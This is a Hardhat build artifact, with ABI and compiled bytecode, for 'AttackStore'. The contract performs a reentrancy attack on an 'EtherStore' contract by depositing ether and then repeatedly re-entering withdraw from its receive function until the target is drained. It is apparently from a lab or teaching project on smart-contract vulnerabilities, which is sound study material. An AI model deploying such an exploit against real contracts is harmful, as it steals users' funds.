{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackStore",
  "sourceName": "contracts/AttackStore.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_etherStoreAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "etherStore",
      "outputs": [
        {
          "internalType": "contract EtherStore",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161053e38038061053e833981810160405281019061003291906100db565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610108565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a88261007d565b9050919050565b6100b88161009d565b81146100c357600080fd5b50565b6000815190506100d5816100af565b92915050565b6000602082840312156100f1576100f0610078565b5b60006100ff848285016100c6565b91505092915050565b610427806101176000396000f3fe6080604052600436106100385760003560e01c806312065fe01461011e5780639e5faafc14610149578063acd2e6e51461015357610119565b3661011957670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101175760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d678ac7230489e800006040518263ffffffff1660e01b81526004016100e4919061031c565b600060405180830381600087803b1580156100fe57600080fd5b505af1158015610112573d6000803e3d6000fd5b505050505b005b600080fd5b34801561012a57600080fd5b5061013361017e565b6040516101409190610346565b60405180910390f35b610151610186565b005b34801561015f57600080fd5b506101686102a9565b60405161017591906103d6565b60405180910390f35b600047905090565b670de0b6b3a764000034101561019b57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561020357600080fd5b505af1158015610217573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d346040518263ffffffff1660e01b81526004016102759190610346565b600060405180830381600087803b15801561028f57600080fd5b505af11580156102a3573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b60006103066103016102fc846102cd565b6102e1565b6102d7565b9050919050565b610316816102eb565b82525050565b6000602082019050610331600083018461030d565b92915050565b610340816102d7565b82525050565b600060208201905061035b6000830184610337565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061039c61039761039284610361565b6102e1565b610361565b9050919050565b60006103ae82610381565b9050919050565b60006103c0826103a3565b9050919050565b6103d0816103b5565b82525050565b60006020820190506103eb60008301846103c7565b9291505056fea2646970667358221220f77531bdf2bdb12ddb5dee643233d8d36e7b374fa45697ef39af241559f3aab264736f6c634300080b0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}